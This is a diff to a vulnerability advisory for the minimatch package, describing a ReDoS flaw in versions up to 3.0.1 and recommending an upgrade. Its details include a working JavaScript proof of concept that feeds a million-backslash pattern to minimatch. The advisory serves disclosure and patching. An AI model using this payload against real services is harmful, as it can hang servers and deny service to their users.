@@ -17,7 +17,7 @@ Schema-Version: '1.0'
 SPDX-License-Identifier: CC-BY-4.0
 ---
 ### Summary
-*Regular Expression Denial of Service*<br><br>Updated to version 3.0.2 or greater
+*Regular Expression Denial of Service*<br><br>Recommendation: Updated to version 3.0.2 or greater
 ### Details
 Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\|/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `\\`.  A proof of concept is as follows: ``` var minimatch = require(“minimatch”);  // utility function for generating long strings var genstr = function (len, chr) {   var result = “”;   for (i=0; i<=len; i++) {     result = result + chr;   }   return result; }  var exploit = “[!” + genstr(1000000, “\\”) + “A”;  // minimatch exploit. console.log(“starting minimatch”); minimatch(“foo”, exploit); console.log(“finishing minimatch”); ```
 <br><br>• Affected Versions: <=3.0.1
